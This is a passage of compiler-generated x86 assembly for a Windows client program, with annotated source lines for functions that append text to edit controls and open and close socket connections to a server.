; [1330] SELECT CASE edit
	mov	eax,d[ebp+8]			;;; i665
; .select1C.0096 = ebp-44	; internal variable
	mov	d[ebp-44],eax			;;; i670
;
; [1331] CASE $$main			:hedit = #main_tab
	mov	eax,200			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0096.0001.client			;;; i71
#ifdef ClearEditText.hedit
#undef ClearEditText.hedit
#endif
#define ClearEditText.hedit ebp-48	; exposes local variable 'hedit'
;
data section 'globals$shared'
align	4
%#main_tab.client:	db 4 dup ?
.code
	mov	eax,d[%#main_tab.client]			;;; i663a
	mov	d[ebp-48],eax			;;; i670
;
; [1332] CASE $$event		:hedit = #event_tab
	jmp	end.select.0096.client			;;; i69
case.0096.0001.client:
	mov	eax,201			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0096.0002.client			;;; i71
data section 'globals$shared'
align	4
%#event_tab.client:	db 4 dup ?
.code
	mov	eax,d[%#event_tab.client]			;;; i663a
	mov	d[ebp-48],eax			;;; i670
;
; [1333] text = "{\\rtf1\\ansi\\deff0{\\fonttbl{\\f0\\froman\\fprq2\\fcharset0 MS Sans Serif;}}{\\colortbl ;\\red100\\green100\\blue100;}\\f0\\cf1\\fs20\\b1  "
	mov	eax,addr @_string.0301.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1334] CASE $$stream		:hedit = #stream_tab
	jmp	end.select.0096.client			;;; i69
case.0096.0002.client:
	mov	eax,202			;;; i659
	mov	ebx,d[ebp-44]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.0096.0003.client			;;; i71
data section 'globals$shared'
align	4
%#stream_tab.client:	db 4 dup ?
.code
	mov	eax,d[%#stream_tab.client]			;;; i663a
	mov	d[ebp-48],eax			;;; i670
;
; [1335] CASE ELSE			:RETURN $$FALSE
	jmp	end.select.0096.client			;;; i69
case.0096.0003.client:
	mov	eax,0			;;; i659
	jmp	end.func1C.client			;;; i258
;
; [1336] END SELECT
end.select.0096.client:
;
; [1338] SendMessageA (hedit, $$WM_SETTEXT, 0, &text)
	mov	eax,d[ebp-40]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	12			;;; i656a
	push	[ebp-48]			;;; i674a
	call	_SendMessageA@16			;;; i619
;
; [1339] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func1C.client			;;; i258
;
; [1340] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClearEditText.client:  ;;; Function end label for Assembly Programmers.
end.func1C.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func1C.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func1C.client:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ClearEditText ()  *****
;  *****
;
; [1343] FUNCTION CPrint (ECtrl,STRING text)
.code
;
#ifdef CPrint.ECtrl
#undef CPrint.ECtrl
#endif
#define CPrint.ECtrl ebp+8	; exposes function argument 'ECtrl'
;
;
#ifdef CPrint.text
#undef CPrint.text
#endif
#define CPrint.text ebp+12	; exposes function argument 'text'
;
align 16
_CPrint.client@8:
;  *****
;  *****  FUNCTION  CPrint ()  *****
;  *****
func3F.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody3F.client:
;
; [1344] SHARED APPLSTATUS
;
; [1347] IFF APPLSTATUS THEN RETURN $$FALSE
	mov	eax,d[%APPLSTATUS.client]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.0097.client			;;; i195
	mov	eax,0			;;; i659
	jmp	end.func3F.client			;;; i258
else.0097.client:
end.if.0097.client:
;
; [1348] IFZ text THEN RETURN $$FALSE
	mov	eax,[ebp+12]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.275			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.0098.client			;;; i192
A.275:
	mov	eax,0			;;; i659
	jmp	end.func3F.client			;;; i258
else.0098.client:
end.if.0098.client:
;
; [1349] IF (WaitForSingleObject (#hsmCPrint,5000) == $$WAIT_TIMEOUT) THEN
data section 'globals$shared'
align	4
%#hsmCPrint.client:	db 4 dup ?
.code
	push	5000			;;; i656a
	push	[%#hsmCPrint.client]			;;; i672a
	call	_WaitForSingleObject@8			;;; i619
	cmp	eax,258			;;; i684a
	jne	>> else.0099.client			;;; i219
;
; [1350] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func3F.client			;;; i258
;
; [1351] END IF
else.0099.client:
end.if.0099.client:
;
; [1353] t0 = SendMessageA (hedit, $$EM_GETLINECOUNT, 0,0 )
#ifdef CPrint.t0
#undef CPrint.t0
#endif
#define CPrint.t0 ebp-40	; exposes local variable 't0'
;
#ifdef CPrint.hedit
#undef CPrint.hedit
#endif
#define CPrint.hedit ebp-44	; exposes local variable 'hedit'
;
	push	0			;;; i656a
	push	0			;;; i656a
	push	186			;;; i656a
	push	[ebp-44]			;;; i674a
	call	_SendMessageA@16			;;; i619
	mov	d[ebp-40],eax			;;; i670
;
; [1354] SELECT CASE ECtrl
	mov	eax,d[ebp+8]			;;; i665
; .select3F.009A = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
;
; [1355] CASE $$main			:hedit = #main_tab
	mov	eax,200			;;; i659
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.009A.0001.client			;;; i71
	mov	eax,d[%#main_tab.client]			;;; i663a
	mov	d[ebp-44],eax			;;; i670
;
; [1356] AddEditText (ECtrl,text)
	mov	eax,d[ebp+12]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func1B.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1357] AddEditText (ECtrl,"\r\n")
	mov	eax,addr @_string.01CE.client			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func1B.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1358] CASE $$event		:hedit = #event_tab
	jmp	end.select.009A.client			;;; i69
case.009A.0001.client:
	mov	eax,201			;;; i659
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.009A.0002.client			;;; i71
	mov	eax,d[%#event_tab.client]			;;; i663a
	mov	d[ebp-44],eax			;;; i670
;
; [1359] AddEditText (ECtrl,text)
	mov	eax,d[ebp+12]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func1B.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1360] AddEditText (ECtrl,"\r\n")
	mov	eax,addr @_string.01CE.client			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func1B.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1361] CASE $$stream		:hedit = #stream_tab
	jmp	end.select.009A.client			;;; i69
case.009A.0002.client:
	mov	eax,202			;;; i659
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.009A.0003.client			;;; i71
	mov	eax,d[%#stream_tab.client]			;;; i663a
	mov	d[ebp-44],eax			;;; i670
;
; [1362] IF (text == "[SPACE]") THEN text = " "
	mov	eax,[ebp+12]			;;; i665
	mov	ebx,addr @_string.030E.client			;;; i663
	call	%_string.compare.vv			;;; i690
	jne	>> else.009B.client			;;; i219
	mov	eax,addr @_string.0145.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
else.009B.client:
end.if.009B.client:
;
; [1363] AddEditText (ECtrl,text)
	mov	eax,d[ebp+12]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func1B.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1364] IF (text == "[RETURN]") THEN AddEditText (ECtrl,"\r\n")'INSTRI(cl,"[RETURN]")
	mov	eax,[ebp+12]			;;; i665
	mov	ebx,addr @_string.030F.client			;;; i663
	call	%_string.compare.vv			;;; i690
	jne	>> else.009C.client			;;; i219
	mov	eax,addr @_string.01CE.client			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func1B.client			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
else.009C.client:
end.if.009C.client:
;
; [1365] CASE ELSE			:ReleaseSemaphore (#hsmCPrint,1,0)
	jmp	end.select.009A.client			;;; i69
case.009A.0003.client:
	push	0			;;; i656a
	push	1			;;; i656a
	push	[%#hsmCPrint.client]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [1366] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func3F.client			;;; i258
;
; [1367] END SELECT
end.select.009A.client:
;
; [1369] t1 = SendMessageA (hedit, $$EM_GETLINECOUNT, 0,0 )
#ifdef CPrint.t1
#undef CPrint.t1
#endif
#define CPrint.t1 ebp-52	; exposes local variable 't1'
;
	push	0			;;; i656a
	push	0			;;; i656a
	push	186			;;; i656a
	push	[ebp-44]			;;; i674a
	call	_SendMessageA@16			;;; i619
	mov	d[ebp-52],eax			;;; i670
;
; [1370] SendMessageA (hedit, $$EM_LINESCROLL, 0,(t1-t0))
	mov	eax,d[ebp-52]			;;; i665
	mov	ebx,d[ebp-40]			;;; i665
	sub	eax,ebx			;;; i791
	push	eax			;;; i667a
	push	0			;;; i656a
	push	182			;;; i656a
	push	[ebp-44]			;;; i674a
	call	_SendMessageA@16			;;; i619
;
; [1371] ReleaseSemaphore (#hsmCPrint,1,0)
	push	0			;;; i656a
	push	1			;;; i656a
	push	[%#hsmCPrint.client]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [1372] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func3F.client			;;; i258
;
; [1373] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.CPrint.client:  ;;; Function end label for Assembly Programmers.
end.func3F.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  CPrint ()  *****
;  *****
;
; [1375] FUNCTION AddEditText (edit, STRING text)
.code
;
#ifdef AddEditText.edit
#undef AddEditText.edit
#endif
#define AddEditText.edit ebp+8	; exposes function argument 'edit'
;
;
#ifdef AddEditText.text
#undef AddEditText.text
#endif
#define AddEditText.text ebp+12	; exposes function argument 'text'
;
align 16
_AddEditText.client@8:
;  *****
;  *****  FUNCTION  AddEditText ()  *****
;  *****
func1B.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.283:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.283			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,184			;;; i114a
;
funcBody1B.client:
;
; [1376] STATIC total[]
data section 'globals$statics'
align	4
%%1B%%total.client:	db 4 dup ?
.code
;
; [1379] IFZ text THEN RETURN $$FALSE
	mov	eax,[ebp+12]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.279			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.009D.client			;;; i192
A.279:
	mov	eax,0			;;; i659
	jmp	end.func1B.client			;;; i258
else.009D.client:
end.if.009D.client:
;
; [1380] IFZ total[] THEN
	mov	eax,d[%%1B%%total.client]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.009E.client			;;; i195
;
; [1381] DIM total[2]
	sub	esp,64			;;; i430
	mov	eax,2			;;; i659
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[%%1B%%total.client]			;;; i663a
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1073217532			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_DimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[%%1B%%total.client],eax			;;; i668
;
; [1382] SendMessageA (#main_tab, $$EM_SETLIMITTEXT,-1, 0)
	mov	eax,1			;;; i659
	neg	eax			;;; i916
; .xstk1B.0000 = ebp-44	; internal variable
	mov	d[ebp-44],eax			;;; i670
	push	0			;;; i656a
	push	[ebp-44]			;;; i674a
	push	197			;;; i656a
	push	[%#main_tab.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [1383] SendMessageA (#event_tab, $$EM_SETLIMITTEXT,-1, 0)
	mov	eax,1			;;; i659
	neg	eax			;;; i916
	mov	d[ebp-44],eax			;;; i670
	push	0			;;; i656a
	push	[ebp-44]			;;; i674a
	push	197			;;; i656a
	push	[%#event_tab.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [1384] SendMessageA (#stream_tab, $$EM_SETLIMITTEXT,-1, 0)
	mov	eax,1			;;; i659
	neg	eax			;;; i916
	mov	d[ebp-44],eax			;;; i670
	push	0			;;; i656a
	push	[ebp-44]			;;; i674a
	push	197			;;; i656a
	push	[%#stream_tab.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [1385] END IF
else.009E.client:
end.if.009E.client:
;
; [1387] SELECT CASE edit
	mov	eax,d[ebp+8]			;;; i665
; .select1B.009F = ebp-48	; internal variable
	mov	d[ebp-48],eax			;;; i670
;
; [1388] CASE $$main			:hedit = #main_tab:e = 0
	mov	eax,200			;;; i659
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.009F.0001.client			;;; i71
#ifdef AddEditText.hedit
#undef AddEditText.hedit
#endif
#define AddEditText.hedit ebp-52	; exposes local variable 'hedit'
;
	mov	eax,d[%#main_tab.client]			;;; i663a
	mov	d[ebp-52],eax			;;; i670
#ifdef AddEditText.e
#undef AddEditText.e
#endif
#define AddEditText.e ebp-56	; exposes local variable 'e'
;
	mov	eax,0			;;; i659
	mov	d[ebp-56],eax			;;; i670
;
; [1389] CASE $$event		:hedit = #event_tab:e = 1
	jmp	end.select.009F.client			;;; i69
case.009F.0001.client:
	mov	eax,201			;;; i659
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.009F.0002.client			;;; i71
	mov	eax,d[%#event_tab.client]			;;; i663a
	mov	d[ebp-52],eax			;;; i670
	mov	eax,1			;;; i659
	mov	d[ebp-56],eax			;;; i670
;
; [1390] CASE $$stream		:hedit = #stream_tab:e = 2
	jmp	end.select.009F.client			;;; i69
case.009F.0002.client:
	mov	eax,202			;;; i659
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.009F.0003.client			;;; i71
	mov	eax,d[%#stream_tab.client]			;;; i663a
	mov	d[ebp-52],eax			;;; i670
	mov	eax,2			;;; i659
	mov	d[ebp-56],eax			;;; i670
;
; [1391] CASE ELSE			:RETURN $$FALSE
	jmp	end.select.009F.client			;;; i69
case.009F.0003.client:
	mov	eax,0			;;; i659
	jmp	end.func1B.client			;;; i258
;
; [1392] END SELECT
end.select.009F.client:
;
; [1394] total[e] = total[e] + LEN(text)
	mov	eax,d[ebp-56]			;;; i665
	mov	edx,d[%%1B%%total.client]			;;; i663a
	mov	eax,d[edx+eax*4]			;;; i464
	mov	ebx,d[ebp+12]			;;; i665
	test	ebx,ebx			;;; i593
	jz	> A.280			;;; i594
	mov	ebx,d[ebx-8]			;;; i595
A.280:
	add	eax,ebx			;;; i775
	mov	ebx,d[ebp-56]			;;; i665
	mov	ecx,d[%%1B%%total.client]			;;; i663a
	lea	ebx,[ecx+ebx*4]			;;; i464
	mov	d[ebx],eax			;;; i30
;
; [1395] SendMessageA (hedit, $$EM_SETSEL, total[e], total[e]+1)
	mov	eax,d[ebp-56]			;;; i665
	mov	edx,d[%%1B%%total.client]			;;; i663a
	mov	eax,d[edx+eax*4]			;;; i464
	mov	d[ebp-44],eax			;;; i670
	mov	eax,d[ebp-56]			;;; i665
	mov	edx,d[%%1B%%total.client]			;;; i663a
	mov	eax,d[edx+eax*4]			;;; i464
	add	eax,1			;;; i775
	push	eax			;;; i667a
	push	[ebp-44]			;;; i674a
	push	177			;;; i656a
	push	[ebp-52]			;;; i674a
	call	_SendMessageA@16			;;; i619
;
; [1396] SendMessageA (hedit, $$EM_REPLACESEL, 0, &text)
	mov	eax,d[ebp+12]			;;; i642
	push	eax			;;; i667a
	push	0			;;; i656a
	push	194			;;; i656a
	push	[ebp-52]			;;; i674a
	call	_SendMessageA@16			;;; i619
;
; [1397] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func1B.client			;;; i258
;
; [1398] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.AddEditText.client:  ;;; Function end label for Assembly Programmers.
end.func1B.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  AddEditText ()  *****
;  *****
;
; [1400] FUNCTION OpenSConnection (idx)
.code
;
#ifdef OpenSConnection.idx
#undef OpenSConnection.idx
#endif
#define OpenSConnection.idx ebp+8	; exposes function argument 'idx'
;
align 16
_OpenSConnection.client@4:
;  *****
;  *****  FUNCTION  OpenSConnection ()  *****
;  *****
func31.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody31.client:
;
; [1401] SHARED TSPROFILE sprofile[]
;
; [1402] SHARED socket
data section 'globals$shared'
align	4
%socket.client:	db 4 dup ?
.code
;
; [1405] sOpen (@socket)
	push	[%socket.client]			;;; i672a
	call	func2F.client			;;; i619
	mov	ecx,d[esp-4]			;;; i877a
	mov	d[%socket.client],ecx			;;; i668
;
; [1406] sprofile[idx].server.socket = socket
	mov	eax,d[ebp+8]			;;; i665
	mov	edx,d[%%%sprofile.client]			;;; i663a
	imul	eax,76			;;; i465a
	lea	eax,[edx+eax]			;;; i464
	mov	ebx,d[%socket.client]			;;; i663a
	mov	d[eax+72],ebx			;;; i13b
;
; [1407] IFT sConnect (idx) THEN
	push	[ebp+8]			;;; i674a
	call	func2C.client			;;; i619
	test	eax,eax			;;; i220
	jz	>> else.00A0.client			;;; i221
;
; [1408] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func31.client			;;; i258
;
; [1409] ELSE
	jmp	end.if.00A0.client			;;; i107
else.00A0.client:
;
; [1410] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func31.client			;;; i258
;
; [1411] END IF
end.if.00A0.client:
;
; [1413] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.OpenSConnection.client:  ;;; Function end label for Assembly Programmers.
end.func31.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  OpenSConnection ()  *****
;  *****
;
; [1416] FUNCTION CloseSConnection (idx)
.code
;
#ifdef CloseSConnection.idx
#undef CloseSConnection.idx
#endif
#define CloseSConnection.idx ebp+8	; exposes function argument 'idx'
;
align 16
_CloseSConnection.client@4:
;  *****
;  *****  FUNCTION  CloseSConnection ()  *****
;  *****
func32.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func32.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.289:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.289			;;; .....
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,172			;;; i114a
;
funcBody32.client:
;
; [1419] getSPServer (idx,@server$,@port,password$,@socket)
#ifdef CloseSConnection.server$
#undef CloseSConnection.server$
#endif
#define CloseSConnection.server$ ebp-40	; exposes local variable 'server$'
;
#ifdef CloseSConnection.port
#undef CloseSConnection.port
#endif
#define CloseSConnection.port ebp-44	; exposes local variable 'port'
;
#ifdef CloseSConnection.password$
#undef CloseSConnection.password$
#endif
#define CloseSConnection.password$ ebp-48	; exposes local variable 'password$'
;
	mov	eax,d[ebp-48]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk32.0000 = ebp-56	; internal variable
	mov	d[ebp-56],eax			;;; i670
#ifdef CloseSConnection.socket
#undef CloseSConnection.socket
#endif
#define CloseSConnection.socket ebp-60	; exposes local variable 'socket'
;
	push	[ebp-60]			;;; i674a
	push	[ebp-56]			;;; i674a
	push	[ebp-44]			;;; i674a
	push	[ebp-40]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func48.client			;;; i619
	sub	esp,20			;;; xnt1i
	mov	ecx,d[esp+4]			;;; i877a
	mov	ebx,d[esp+8]			;;; i877b
	mov	[ebp-40],ecx			;;; i670
	mov	d[ebp-44],ebx			;;; i670
	mov	esi,d[esp+12]			;;; i871
	call	%____free			;;; i872
	mov	ecx,d[esp+16]			;;; i877a
	mov	d[ebp-60],ecx			;;; i670
	add	esp,20			;;; i633
;
; [1420] shutdown (socket,$$SD_BOTH)
;
; [0] EXTERNAL SFUNCTION  shutdown         (socket, how)
	push	2			;;; i656a
	push	[ebp-60]			;;; i674a
	call	_shutdown@8			;;; i619
;
; [1421] DIM buffer[0]
#ifdef CloseSConnection.buffer
#undef CloseSConnection.buffer
#endif
#define CloseSConnection.buffer ebp-64	; exposes local variable 'buffer'
;
	sub	esp,64			;;; i430
	mov	eax,0			;;; i659
	mov	d[esp+16],eax			;;; i432
	mov	esi,d[ebp-64]			;;; i665
	mov	d[esp],esi			;;; i433
	mov	d[esp+4],1			;;; i434
	mov	d[esp+8],-1073217532			;;; i435
	mov	d[esp+12],0			;;; i436
	call	%_DimArray			;;; i437
	add	esp,64			;;; i438
	mov	d[ebp-64],eax			;;; i670
;
; [1422] DO
align 8
do.00A1.client:
;
; [1423] ret = recv(socket, &buffer[], SIZE(buffer[]), 0)
#ifdef CloseSConnection.ret
#undef CloseSConnection.ret
#endif
#define CloseSConnection.ret ebp-68	; exposes local variable 'ret'
;
	mov	eax,d[ebp-64]			;;; i665
	test	eax,eax			;;; i586
	jz	> A.286			;;; i587
	mov	esi,d[eax-4]			;;; i588
	mov	eax,d[eax-8]			;;; i589
	and	esi,65535			;;; i590
	imul	eax,esi			;;; i591
A.286:
	mov	d[ebp-56],eax			;;; i670
	push	0			;;; i656a
	push	[ebp-56]			;;; i674a
	push	[ebp-64]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	_recv@16			;;; i619
	mov	d[ebp-68],eax			;;; i670
;
; [1424] IF (ret == $$SOCKET_ERROR) THEN EXIT DO
	mov	eax,d[ebp-68]			;;; i665
	cmp	eax,-1			;;; i684a
	jne	>> else.00A2.client			;;; i219
	jmp	end.do.00A1.client			;;; i144
else.00A2.client:
end.if.00A2.client:
;
; [1425] IF (ret == 0) THEN EXIT DO
	mov	eax,d[ebp-68]			;;; i665
	cmp	eax,0			;;; i684a
	jne	>> else.00A3.client			;;; i219
	jmp	end.do.00A1.client			;;; i144
else.00A3.client:
end.if.00A3.client:
;
; [1426] LOOP
do.loop.00A1.client:
	jmp	do.00A1.client			;;; i222
end.do.00A1.client:
;
; [1427] closesocket (socket)
	push	[ebp-60]			;;; i674a
	call	_closesocket@4			;;; i619
;
; [1428] setSPServer (idx,"",0,"",0)
	push	0			;;; i656a
	push	0			;;; i665a
	push	0			;;; i656a
	push	0			;;; i665a
	push	[ebp+8]			;;; i674a
	call	func47.client			;;; i619
;
; [1429] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func32.client			;;; i258
;
; [1430] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.CloseSConnection.client:  ;;; Function end label for Assembly Programmers.
end.func32.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func32.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
free.func32.client:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
	mov	esi,d[ebp-64]			;;; i665
	call	%_FreeArray			;;; i424
  ret
;-peep
;  *****
;  *****  END FUNCTION  CloseSConnection ()  *****
;  *****
;
; [1432] FUNCTION  Initialize ()
.code
align 16
_Initialize.client@0:
;  *****
;  *****  FUNCTION  Initialize ()  *****
;  *****
func2.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.292:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.292			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,184			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,12				;;; ..
	xor	eax,eax			;;; ...
A.293:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.293			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody2.client:
;
; [1433] WSADATA wsadata
; .composites = ebp-40	; internal variable
#ifdef Initialize.wsadata
#undef Initialize.wsadata
#endif
#define Initialize.wsadata ebp-44	; exposes local variable 'wsadata'
;
;
; [1434] SHARED APPLSTATUS
;
; [1437] 'SetPriorityClass (GetCurrentProcess(),$$IDLE_PRIORITY_CLASS)
;
; [1439] IF WSAStartup (2 |(2 << 8), &wsadata) THEN
;
; [0] EXTERNAL SFUNCTION  WSAStartup       (version, addrWSADATA)
	mov	eax,2			;;; i659
	shl	eax,8			;;; i835
	mov	ebx,2			;;; i659
	or	eax,ebx			;;; i763
